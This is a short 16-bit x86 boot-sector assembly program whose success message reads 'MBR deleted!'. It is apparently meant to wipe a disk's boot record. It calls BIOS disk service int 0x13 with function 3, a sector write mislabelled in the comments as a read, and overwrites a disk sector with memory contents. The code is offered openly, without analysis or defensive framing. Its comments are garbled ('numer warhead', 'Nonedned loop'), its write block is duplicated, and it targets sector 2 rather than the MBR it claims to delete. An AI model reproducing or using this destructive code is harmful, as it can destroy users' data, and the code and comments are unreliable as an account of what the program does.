[BITS 16]
[ORG 0x7c00]

start:
    mov ax, 0x0000  ; Segment 0
    mov es, ax      ; ES = 0

    mov bx, 0x0000  ; Offset 0
    mov ah, 0x03    ; AH = 3 (read sector)
    mov al, 0x01    ; AL = 1 (count of sector to read)
    mov ch, 0x00    ; CH = 0 (count cylinder seal )
    mov cl, 0x02    ; CL = 2 (numer sector)
    mov dh, 0x00    ; DH = 0 (numer warhead)
    int 0x13        ; Stopped 0x13 (BIOS Disk Services)

    jc error        ; Handling Error, if CF (Carry Flag) is set.

    xor ax, ax      ; Clear ax
    mov es, ax      ; ES = 0

    mov bx, 0x0000  ; Offset 0
    mov ah, 0x03    ; AH = 3 (read sector)
    mov al, 0x01    ; AL = 1 (count of sector to read)
    mov ch, 0x00    ; CH = 0 (count cylinder seal )
    mov cl, 0x02    ; CL = 2 (numer sector)
    mov dh, 0x00    ; DH = 0 (numer warhead)
    int 0x13        ; Stopped 0x13 (BIOS Disk Services)

    jc error        ; Handling Error, if CF (Carry Flag) is set.

    mov si, success_msg ; Display msg of success.
    call print_string

    jmp $           ; Nonedned loop

error:
    mov si, error_msg   ; Display msg of error.
    call print_string

    jmp $           ; Nonedned loop

print_string:
    lodsb           ; Set char from SI to AL
    cmp al, 0       ; If is end of string?
    je done         ; If yes, exit

    mov ah, 0x0E    ; AH = 0x0E (Output char on sisplay)
    int 0x10        ; Stop 0x10 (BIOS Video Services)
    jmp print_string ; Repead for each of znaku

done:
    ret

success_msg db "MBR deleted!", 0
error_msg   db "Error while delete MBR!", 0

times 510-($-$$) db 0   ; Set change sector zeros
dw 0xAA55               ; Signature MBR
